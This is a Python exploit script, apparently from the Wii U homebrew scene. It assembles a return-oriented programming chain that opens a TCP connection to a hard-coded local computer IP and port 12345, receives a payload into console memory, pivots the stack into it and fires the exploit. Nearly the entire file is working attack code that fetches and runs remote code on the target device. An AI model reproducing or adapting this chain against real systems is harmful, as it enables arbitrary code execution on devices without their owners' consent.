import socket, time, struct
from wiiu_rop_utils import *
from exploit import *

rop = WiiU_ROP_Utils(9)
COMPUTER_IP_ADDR = "192.168.1.52"


def ip2int(addr):
    return struct.unpack("!I", socket.inet_aton(addr))[0]

def _exploit(payload):
	run_exploit(payload)

def calc_addr(idx):
	return (0x387D36AC + ((idx - 9) *4))

def sysapp_to_realaddr(addr):
	return addr + (0x0EED81C0 - 0x02000000)

def doBL(dst, src):
	newval = (dst - src)
	newval &= 0x03FFFFFC
	newval |= 0x48000001
	return newval

def GX2WaitForVsync():
	rop.tiny_call(ROP_GX2WaitForVsync)

def userspace_to_kheap_index(addr):
  return (0x10000000 + ((addr - 0xFF200014)//16))

# ROP CHAIN -------------------------------------------------------------------


AF_INET = 2
SOCK_STREAM = 1
IPPROTO_TCP = 6

new_rop_index = 100
socket_stuff_idx = 209

def to_sysnet_addr(addr):
	return 0x10BFD80 + addr

rop.DCFlushRange(calc_addr(-9), 0x500)

# Create thread
rop.OSCreateThread(0x4D066000, ROP_POP_R24_TO_R31, 0, 0, 0x4D070000, 0x10000, 0, 2 | 8)
# change thread r1 so we jump to our ROP Chain

rop.call_func(ROP_memcpy, 0x4D070000 + 0x14, calc_addr(new_rop_index), 0x400)
rop.DCFlushRange(0x4D066000, 0x20000)
# osresumethread
rop.tiny_call(0x02025D08 - 0xFE3C00, 0x4D066000)

rop.append(ROP_OSExitThread) # 0x01041D6C

# socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
rop.call_func(to_sysnet_addr(0x2448), AF_INET, SOCK_STREAM, IPPROTO_TCP, 0)

# connect(socket_fd, &sin, 0x10)
rop.call_func(to_sysnet_addr(0xAA8), 4, 0x4D070000 + 0x14 + ((socket_stuff_idx - new_rop_index) * 4), 0x10, 0)

def GX2WaitForVsync():
	rop.tiny_call(0x01151964)

GX2WaitForVsync()
GX2WaitForVsync()

# recv(rpc, (char*)0x4D120000, 0x2800, 0)
rop.call_func(to_sysnet_addr(0xD6C), 4, 0x4D120000, 0x2800, 0)

rop.DCFlushRange(0x4D120000, 0x2800)
rop.StackPivot(0x4D120000)

# sin.family + port
rop.append((AF_INET << 16) | 12345)
rop.append(ip2int(COMPUTER_IP_ADDR)) # your computer local IP
rop.append(0)
rop.append(0)


# end of ROP CHAIN -------------------------------------------------------------------



for i in range(len(rop.rop_payload)):
	print("%3d: %08X" %(i,rop.rop_payload[i]))

print("")
print(rop.rop_payload.index(0x01041D6C) + 1)
print(rop.rop_payload.index(0x00020000 + 12345))
print("")
input("Press ENTER to continue")


for i in range(256 - len(rop.rop_payload)):
	if i >= 0:
		rop.append(0xF5A5A5A5)

_exploit(rop.rop_payload)